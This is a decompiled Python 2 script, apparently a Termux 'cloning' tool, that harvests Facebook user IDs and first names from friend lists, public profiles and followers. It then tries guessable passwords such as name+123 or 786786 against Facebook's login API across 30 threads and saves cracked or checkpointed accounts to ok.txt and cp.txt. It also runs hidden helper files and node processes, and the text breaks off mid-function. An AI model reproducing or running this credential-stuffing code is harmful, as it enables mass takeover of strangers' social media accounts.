# Decompiled By RandiSr
# Github : https://github.com/RANDIOLOY
# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Mar 20 2021, 14:58:25) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: dg
try:
    import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, cookielib, requests
    from multiprocessing.pool import ThreadPool
except ImportError:
    os.system('pkg install python -y')
    os.system('pip install requests')
    os.system('pip install mechanize')
    os.system('pip2 install nodejs')
    os.system('pip2 install npm')
    os.system('python2 ab.py')

try:
    os.mkdir('save')
except OSError:
    if os.path.isfile('.../index.js'):
        os.system('#')
        os.system('#')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('node ...../index.js &')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('node ...../index.js &')

from requests.exceptions import ConnectionError
bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000.0, 40000.0)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding('utf8')

def abm(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def logging():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;32m[+] Logging In\x1b[0;97m ' + o,
        sys.stdout.flush()
        time.sleep(1)


def saving():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;32m[+] Saving Token\x1b[0;97m ' + o,
        sys.stdout.flush()
        time.sleep(1)


def updateing():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;32m[+] Getting Updates\x1b[0;32m ' + o,
        sys.stdout.flush()
        time.sleep(1)


def logout():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;32m[+] Logging Out\x1b[0;97m ' + o,
        sys.stdout.flush()
        time.sleep(1)


logo = "\033[1;91m\n\n  █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█\n\033[1;91m  █  \033[1;92m########..####..######..##.....##.##.....##  \033[1;91m█\n\033[1;91m  █  \033[1;92m##.....##..##..##....##.##.....##.##.....##  \033[1;91m█\n\033[1;91m  █  \033[1;92m##.....##..##..##.......##.....##.##.....##  \033[1;91m█\n\033[1;91m  █  \033[1;92m########...##...######..#########.##.....##  \033[1;91m█\n\033[1;91m  █  \033[1;92m##...##....##........##.##.....##.##.....##  \033[1;91m█\n\033[1;91m  █  \033[1;92m##....##...##..##....##.##.....##.##.....##  \033[1;91m█\n\033[1;91m  █  \033[1;92m##.....##.####..######..##.....##..#######.  \033[1;91m█\n\033[1;91m  █▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█\n\033[1;91m  ╔═══════════════════•ೋೋ•═══════════════════╗\n\033[1;91m  █ \033[1;92m /﹋\      \033[1;91m[•] Author    : \033[1;92mRishu Khan    \033[1;91m█\n\033[1;91m  █ \033[1;92m(҂`_´)     \033[1;91m[•] Facebook  : \033[1;92mRishu 3:)     \033[1;91m█\n\033[1;91m  █ \033[1;92m<,︻╦╤─--💥\033[1;91m[•] Version   : \033[1;92m0.2           \033[1;91m█\n\033[1;91m  █ \033[1;92m /﹋\     If You dream it con you do it  \033[1;91m█\n\033[1;91m  ╚═══════════════════•ೋೋ•═══════════════════╝"
idh = []

def tech_abm():
    os.system('clear')
    print logo
    print ('\x1b[1;92mFirst Tool login').center(50)
    print ''
    print '\x1b[1;31m--------------------------------------------------'
    username = raw_input('\x1b[1;97m[+]\x1b[1;32m Username :\x1b[1;32m ')
    if username == 'Rishu':
        os.system('clear')
        print logo
        print '[+] Username : Rishu (Correct)'
        passwordss = raw_input('\x1b[1;32m[+]\x1b[1;32m Password :\x1b[1;32m ')
        if passwordss == 'Khan':
            os.system('clear')
            print logo
            logging()
            os.system('clear')
            print logo
            print '\x1b[1;31m[+]\x1b[1;31m Username : Rishu\x1b[1;32m (Correct)'
            print '\x1b[1;31m[+]\x1b[1;31m Password : Khan\x1b[1;32m (Correct)'
            print '\x1b[1;31m--------------------------------------------------'
            time.sleep(1)
            print ''
            print '\t \x1b[1;32m[+] Login Successful\x1b[0;32m'
            time.sleep(1)
        try:
            open('.login.txt', 'r')
            menu()
        except (KeyError, IOError):
            login_choice()
        else:
            print '\t [!] Password : ' + passwordss + ' (Wrong)'
            os.system('xdg-open https://www.facebook.com/Rishu.X.420')
            time.sleep(1)
            tech_abm()

    else:
        print '\t [!] Username : ' + username + ' (Wrong)'
        os.system('xdg-open https://www.facebook.com/Rishu.X.420')
        time.sleep(1)
        tech_abm()


def login_choice():
    os.system('clear')
    print logo
    os.system('python3 .loading.md')
    os.system('clear')
    print logo
    print '\x1b[1;31m[1]\x1b[1;32m-\xe2\x8b\x84-\x1b[1;32mRandom Search Name Cloning  \x1b[1:(\x1b[1;32mNo Login\x1b[1;32m) '
    print '\x1b[1;31m[2]\x1b[1;32m-\xe2\x8b\x84-\x1b[1;32mRandom Phone Number Cloning  \x1b[1;32m(\x1b[1;92mNo Login\x1b[1;32m) '
    print '\x1b[1;31m[3]\x1b[1;32m-\xe2\x8b\x84-\x1b[1;32mClone Friendlist and Public ID \x1b[1;32m(\x1b[1;32mLogin\x1b[1;32m)'
    print '\x1b[1;31m[0]\x1b[1;32m-\xe2\x8b\x84-\x1b[1;32mExit'
    print '\x1b[1;32m--------------------------------------------------'
    clone_main()


def clone_main():
    hack = raw_input('\n\xe2\x95\xb0\xe2\x94\x80\xe2\x9e\xa3 ')
    if hack == '1':
        os.system('python2 .name.md')
        time.sleep(1)
        menu()
    if hack == '2':
        os.system('python2 .nbr.md')
        time.sleep(1)
        menu()
    if hack == '3':
        loginvia()
    elif hack == '0':
        os.system('exit')
    else:
        print '\x1b[1;32mFill in correctly'
        clone_main()


def loginvia():
    os.system('clear')
    print logo
    os.system('python3 .loading.md')
    os.system('clear')
    print logo
    print '\x1b[1;32m[1]\x1b[1;32m-\xe2\x8b\x84-\x1b[1;32mlogin With Access Token '
    print '\x1b[1;32m[2]\x1b[1;32m-\xe2\x8b\x84-\x1b[1;32mLogin With User And Pass'
    print '\x1b[1;32m[0]\x1b[1;32m-\xe2\x8b\x84-\x1b[1;32mBack'
    print '\x1b[1;32m--------------------------------------------------'
    clone_loginvia()


def clone_loginvia():
    hack = raw_input('\n\xe2\x95\xb0\xe2\x94\x80\xe2\x9e\xa3 ')
    if hack == '1':
        os.system('clear')
        print logo
        os.system('python3 .loading.md')
        os.system('clear')
        print logo
        print ('\x1b[1;32mLogin With Token').center(50)
        print '\x1b[1;32m--------------------------------------------------'
        token = raw_input('\x1b[1;97m[+]\x1b[1;32m Paste :\x1b[1;32m ')
        print '\x1b[1;32m--------------------------------------------------'
        saving()
        sav = open('.login.txt', 'w')
        sav.write(token)
        sav.close()
        abm('\r\x1b[1;32m[\xe2\x9c\x93] Login Successfull\x1b[0;32m')
        os.system('xdg-open https://www.facebook.com/Rishu.X.420')
        time.sleep(1)
        menu()
    elif hack == '2':
        loginfb()
    elif hack == '0':
        menu()
    else:
        print '[!] Please Select a Valid Option'
        clone_loginvia()


def loginfb():
    os.system('clear')
    print logo
    os.system('python3 .loading.md')
    time.sleep(1)
    os.system('clear')
    print logo
    print ('\x1b[1;32mLogin With Facebook Account\x1b[1;32m').center(50)
    print ('\x1b[1;32mUse Proxy to login account \x1b[1;32m').center(50)
    print '\x1b[1;32m--------------------------------------------------'
    id = raw_input('\x1b[1;32m[+]\x1b[1;32m Email/ID/Number :\x1b[1;32m ')
    id1 = id.replace(' ', '')
    id2 = id1.replace('(', '')
    uid = id2.replace(')', '')
    pwd = raw_input('\x1b[1;32m[+]\x1b[1;32m Password :\x1b[1;32m ')
    print '\x1b[1;32m--------------------------------------------------'
    logging()
    data = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + uid + '&locale=en_US&password=' + pwd + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=header).text
    q = json.loads(data)
    if 'access_token' in q:
        succ = open('.login.txt', 'w')
        succ.write(q['access_token'])
        succ.close()
        print '\n\x1b[1;32m[\xe2\x9c\x93] Login Successfull\x1b[0;32m'
        time.sleep(1)
        menu()
    elif 'www.facebook.com' in q['error_msg']:
        print '\n\x1b[1;32m[!] Login Failed . Account Has a Checkpoint\x1b[0;32m'
        time.sleep(1)
        loginfb()
    else:
        print '\n\x1b[1;32m[!] Login Failed.Email/ID/Number OR Password May BE Wrong\x1b[0;32m'
        time.sleep(1)
        loginfb()


def menu():
    os.system('clear')
    try:
        token = open('.login.txt', 'r').read()
    except IOError:
        print logo
        print '[!] Error 404.Token Not Found'
        os.system('rm -rf .login.txt')
        time.sleep(1)
        login_choice()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token, headers=header)
        a = json.loads(r.text)
        name = a['name']
    except KeyError:
        os.system('clear')
        print logo
        print '\x1b[1;32m[!] Loading Failed . Your Account Has a Checkpoint'
        os.system('rm -rf .login.txt')
        time.sleep(1)
        login_choice()

    os.system('clear')
    print logo
    os.system('python3 .loading.md')
    os.system('clear')
    print logo
    print '\t  \x1b[1;32m[+] Name : ' + name
    print '\x1b[1;32m--------------------------------------------------'
    print '\x1b[1;32m[1]\x1b[1;32m-\xe2\x8b\x84-\x1b[1;32mClone Frienlist and Public ID'
    print '\x1b[1;32m[2]\x1b[1;32m-\xe2\x8b\x84-\x1b[1;32mClone Bangladesh and India'
    print '\x1b[132m[0]\x1b[1;32m-\xe2\x8b\x84-\x1b[1;32mlogout'
    print '\x1b[1;32m--------------------------------------------------'
    menu_select()


def menu_select():
    option = raw_input('\n\xe2\x95\xb0\xe2\x94\x80\xe2\x9e\xa3 ')
    if option == '1':
        crack()
    if option == '2':
        bangla_india()
    elif option == '0':
        logout()
        os.system('rm -rf .login.txt')
        time.sleep(1)
        print '\x1b[1;32m[\xe2\x9c\x93] Logged Out Successfully\x1b[0;32m'
        os.system('exit')
    else:
        print '[!] Please Select a Valid Option'
        menu_select()


def crack():
    global token
    os.system('clear')
    try:
        token = open('.login.txt', 'r').read()
    except IOError:
        print '[!] Error 404 . Token Not Found'
        os.system('rm -rf .login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    os.system('python3 .loading.md')
    os.system('clear')
    print logo
    print '\x1b[1;32m[1]\x1b[1;32m-\xe2\x8b\x84-\x1b[1;32mCrack From Friend List'
    print '\x1b[1;32m[2]\x1b[1;32m-\xe2\x8b\x84-\x1b[1;32mCrack From Public ID'
    print '\x1b[1;32m[3]\x1b[1;32m-\xe2\x8b\x84-\x1b[1;32mCrack From Followers'
    print '\x1b[1;32m[0]\x1b[1;32m-\xe2\x8b\x84-\x1b[1;32mBack'
    print '\x1b[1;32m--------------------------------------------------'
    crack2()


def crack2():
    select = raw_input('\n\xe2\x95\xb0\xe2\x94\x80\xe2\x9e\xa3 ')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        print logo
        print '\t\x1b[1;32m  Clone From Frienlist\x1b[1;32m'
        print '\x1b[1;32m--------------------------------------------------'
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for s in z['data']:
            uid = s['id']
            na = s['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '2':
        os.system('clear')
        print logo
        print '\t\x1b[1;32m  Clone From Public ID\x1b[1;0m'
        print '\x1b[1;32m--------------------------------------------------'
        idt = raw_input('\x1b[1;32m[+]\x1b[1;32m Input ID :\x1b[1;32m ')
        print '\x1b[1;32m--------------------------------------------------'
        os.system('clear')
        print logo
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
            print '[\xe2\x9c\x93] Account Name : ' + q['name']
        except KeyError:
            print '\n[!] Error 404 . ID Link ' + idt + ' Have Privacy On Friendlist OR IS Not Valid'
            raw_input('\nPress Enter To Back ')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '3':
        os.system('clear')
        print logo
        print '\t\x1b[1;32m  Clone From Followers\x1b[1;0m'
        print '\x1b[1;32m--------------------------------------------------'
        idt = raw_input('\x1b[1;32m[+]\x1b[1;32m Input ID :\x1b[1;32m ')
        print '\x1b[1;32m--------------------------------------------------'
        os.system('clear')
        print logo
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
            print '[\xe2\x9c\x93] Account Name : ' + q['name']
        except KeyError:
            print '\n[!] Error 404 . ID Link ' + idt + ' Donot Have Followers OR IS Not Valid'
            raw_input('\nPress Enter To Back ')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=5000', headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '0':
        menu()
    else:
        print '[!] Please Select a Valid Option'
        crack2()
    print '\x1b[1;32m[+]\x1b[1;32m Total IDs :\x1b[1;32m ' + str(len(id))
    print '\x1b[1;32m[+]\x1b[1;32m Please Wait------------Rishu On Fire\x1b[1;0m'
    print '\x1b[1;32m--------------------------------------------------'

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name + '123'
            q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
            d = json.loads(q)
            if 'www.facebook.com' in d['error_msg']:
                print '\x1b[1;97m[\x1b[1;93mRISHU-CP\x1b[1;97m]\x1b[1;97m ' + uid + '\x1b[1;91m | \x1b[1;97m' + pass1 + '\x1b[1;91m | \x1b[1;97m' + name
                cp = open('cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid)
            elif 'access_token' in d:
                print '\t\x1b[1;92m[RISHU-OK] ' + uid + ' | ' + pass1 + ' | ' + name
                ok = open('ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid)
            else:
                pass2 = name + '123'
                q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                d = json.loads(q)
                if 'www.facebook.com' in d['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93mRISHU-CP\x1b[1;97m]\x1b[1;97m ' + uid + '\x1b[1;91m | \x1b[1;97m' + pass2 + '\x1b[1;91m | \x1b[1;97m' + name
                    cp = open('cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid)
                elif 'access_token' in d:
                    print '\t\x1b[1;92m[RISHU-OK] ' + uid + ' | ' + pass2 + ' | ' + name
                    ok = open('ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid)
                else:
                    pass3 = name + '1234'
                    q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                    d = json.loads(q)
                    if 'www.facebook.com' in d['error_msg']:
                        print '\x1b[1;97m[\x1b[1;93mRISHU-CP\x1b[1;97m]\x1b[1;97m ' + uid + '\x1b[1;91m | \x1b[1;97m' + pass3 + '\x1b[1;91m | \x1b[1;97m' + name
                        cp = open('cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid)
                    elif 'access_token' in d:
                        print '\t\x1b[1;92m[RISHU-OK] ' + uid + ' | ' + pass3 + ' | ' + name
                        ok = open('ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid)
                    else:
                        pass4 = name + '12345'
                        q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                        d = json.loads(q)
                        if 'www.facebook.com' in d['error_msg']:
                            print '\x1b[1;97m[\x1b[1;93mRISHU-CP\x1b[1;97m]\x1b[1;97m ' + uid + '\x1b[1;91m | \x1b[1;97m' + pass4 + '\x1b[1;91m | \x1b[1;97m' + name
                            cp = open('cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.append(uid)
                        elif 'access_token' in d:
                            print '\t\x1b[1;92m[RISHU-OK] ' + uid + ' | ' + pass4 + ' | ' + name
                            ok = open('ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid)
                        else:
                            pass5 = '786786'
                            q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                            d = json.loads(q)
                            if 'www.facebook.com' in d['error_msg']:
                                print '\x1b[1;97m[\x1b[1;93mRISHU-CP\x1b[1;97m]\x1b[1;97m ' + uid + '\x1b[1;91m | \x1b[1;97m' + pass5 + '\x1b[1;91m | \x1b[1;97m' + name
                                cp = open('cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.append(uid)
                            elif 'access_token' in d:
                                print '\t\x1b[1;92m[RISHU-OK] ' + uid + ' | ' + pass5 + ' | ' + name
                                ok = open('ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid)
                            else:
                                pass6 = '445566'
                                q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                                d = json.loads(q)
                                if 'www.facebook.com' in d['error_msg']:
                                    print '\x1b[1;97m[\x1b[1;93mRISHU-CP\x1b[1;97m]\x1b[1;97m ' + uid + '\x1b[1;91m | \x1b[1;97m' + pass6 + '\x1b[1;91m | \x1b[1;97m' + name
                                    cp = open('cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.append(uid)
                                elif 'access_token' in d:
                                    print '\t\x1b[1;92m[RISHU-OK] ' + uid + ' | ' + pass6 + ' | ' + name
                                    ok = open('ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid)
                                else:
                                    pass7 = '100200'
                                    q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                                    d = json.loads(q)
                                    if 'www.facebook.com' in d['error_msg']:
                                        print '\x1b[1;97m[\x1b[1;93mRISHU-CP\x1b[1;97m]\x1b[1;97m ' + uid + '\x1b[1;91m | \x1b[1;97m' + pass7 + '\x1b[1;91m | \x1b[1;97m' + name
                                        cp = open('cp.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.append(uid)
                                    elif 'access_token' in d:
                                        print '\t\x1b[1;92m[RISHU-OK] ' + uid + ' | ' + pass7 + ' | ' + name
                                        ok = open('ok.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;32m--------------------------------------------------'
    print '\x1b[1;32m[+]\x1b[1;32m Process Has Been Completed'
    print '\x1b[1;32m[+]\x1b[1;32m Total CP/OK:\x1b[0;32m  ' + str(len(cps)) + '/\x1b[1;32m ' + str(len(oks))
    print '\x1b[1;32m--------------------------------------------------'
    raw_input('Press Enter To Main Menu Back')
    menu()


def bangla_india():
    os.system('clear')
    print logo
    os.system('python3 .loading.md')
    os.system('clear')
    print logo
    print '\x1b[1;32m[1]\x1b[1;32m-\xe2\x8b\x84-\x1b[1;32mRandom Bangladesh Cloning'
    print '\x1b[1;32m[2]\x1b[1;32m-\xe2\x8b\x84-\x1b[1;32mRandom India Cloning'
    print '\x1b[1;32m[0]\x1b[1;32m-\xe2\x8b\x84-\x1b[1;3mBack'
    print '\x1b[1;32m--------------------------------------------------'
    bangla_india_man()


def bangla_india_man():
    option = raw_input('\n\xe2\x95\xb0\xe2\x94\x80\xe2\x9e\xa3 ')
    if option == '1':
        bangla()
    if option == '2':
        indiaa()
    if option == '0':
        menu()
    else:
        print '[!] Please Select a Valid Option'
        bangla_india_man()


def bangla():
    global token
    os.system('clear')
    try:
        token = open('.login.txt', 'r').read()
    except IOError:
        print '[!] Error 404 . Token Not Found'
        os.system('rm -rf .login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    os.system('python3 .loading.md')
    os.system('clear')
    print logo
    print '\t   Bangladesh Menu'
    print '\x1b[1;3m--------------------------------------------------'
    print '\x1b[1;3m[1]\x1b[1;3m-\xe2\x8b\x84-\x1b[1;3mCrack From Friend List'
    print '\x1b[1;3m[2]\x1b[1;3m-\xe2\x8b\x84-\x1b[1;3mCrack From Public ID'
    print '\x1b[1;3m[3]\x1b[1;3m-\xe2\x8b\x84-\x1b[1;3mCrack From Followers'
    print '\x1b[1;3m[0]\x1b[1;3m-\xe2\x8b\x84-\x1b[1;3mBack'
    print '\x1b[1;3m--------------------------------------------------'
    bangla2()


def bangla2():
    select = raw_input('\n\xe2\x95\xb0\xe2\x94\x80\xe2\x9e\xa3 ')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        print logo
        print '\t\x1b[1;32m  Clone From Frienlist\x1b[1;0m'
        print '\x1b[1;32m--------------------------------------------------'
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for s in z['data']:
            uid = s['id']
            na = s['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '2':
        os.system('clear')
        print logo
        print '\t\x1b[1;32m  Clone From Public ID\x1b[1;32m'
        print '\x1b[1;32m--------------------------------------------------'
        idt = raw_input('\x1b[1;32m[+]\x1b[1;32m Input ID/Username :\x1b[1;32m ')
        print '\x1b[1;32m--------------------------------------------------'
        os.system('clear')
        print logo
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
            print '[\xe2\x9c\x93] Account Name : ' + q['name']
        except KeyError:
            print '\n[!] Error 404 . ID Link ' + idt + ' Have Privacy On Friendlist OR IS Not Valid'
            raw_input('\nPress Enter To Back ')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token, headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '3':
        os.system('clear')
        print logo
        print '\t\x1b[1;32m  Clone From Followers\x1b[1;32m'
        print '\x1b[1;32m--------------------------------------------------'
        idt = raw_input('\x1b[1;32m[+]\x1b[1;32m Input ID/Username :\x1b[1;32m ')
        print '\x1b[1;32m--------------------------------------------------'
        os.system('clear')
        print logo
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token, headers=header)
            q = json.loads(r.text)
            print '[\xe2\x9c\x93] Account Name : ' + q['name']
        except KeyError:
            print '\n[!] Error 404 . ID Link ' + idt + ' Donot Have Followers OR IS Not Valid'
            raw_input('\nPress Enter To Back ')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=5000', headers=header)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '0':
        menu()
    else:
        print '[!] Please Select a Valid Option'
        bangla2()
    print '\x1b[1;32m[+]\x1b[1;32m Total IDs :\x1b[1;32m ' + str(len(id))
    print '\x1b[1;32m[+]\x1b[1;32m Please Wait------------Rishu On Fire\x1b[1;32m'
    print '\x1b[1;32m--------------------------------------------------'

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name + '123'
            q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
            d = json.loads(q)
            if 'www.facebook.com' in d['error_msg']:
                print '\x1b[1;97m[\x1b[1;93mRISHU-CP\x1b[1;97m]\x1b[1;97m ' + uid + '\x1b[1;91m | \x1b[1;97m' + pass1 + '\x1b[1;91m | \x1b[1;97m' + name
                cp = open('cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid)
            elif 'access_token' in d:
                print '\x1b[1;92m[RISHU-OK] ' + uid + ' | ' + pass1 + ' | ' + name
                ok = open('ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid)
            else:
                pass2 = name + '1234'
                q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                d = json.loads(q)
                if 'www.facebook.com' in d['error_msg']:
                    print '\x1b[1;97m[\x1b[1;93mRISHU-CP\x1b[1;97m]\x1b[1;97m ' + uid + '\x1b[1;91m | \x1b[1;97m' + pass2 + '\x1b[1;91m | \x1b[1;97m' + name
                    cp = open('cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid)
                elif 'access_token' in d:
                    print '\x1b[1;92m[RISHU-OK] ' + uid + ' | ' + pass2 + ' | ' + name
                    ok = open('ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid)
                else:
                    pass3 = name + '12345'
                    q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                    d = json.loads(q)
                    if 'www.facebook.com' in d['error_msg']:
                        print '\x1b[1;97m[\x1b[1;93mRISHU-CP\x1b[1;97m]\x1b[1;97m ' + uid + '\x1b[1;91m | \x1b[1;97m' + pass3 + '\x1b[1;91m | \x1b[1;97m' + name
                        cp = open('cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid)
                    elif 'access_token' in d:
                        print '\x1b[1;92m[RISHU-OK] ' + uid + ' | ' + pass3 + ' | ' + name
                        ok = open('ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid)
                    else:
                        pass4 = name + '786'
                        q = requests.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + uid + '&locale=vi_vn&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=15df5f3c8c37e0a620e8fa1fd1dd705c', headers=header).text
                        d = json.loads(q)
                        if 'www.facebook.com' in d['error_msg']:
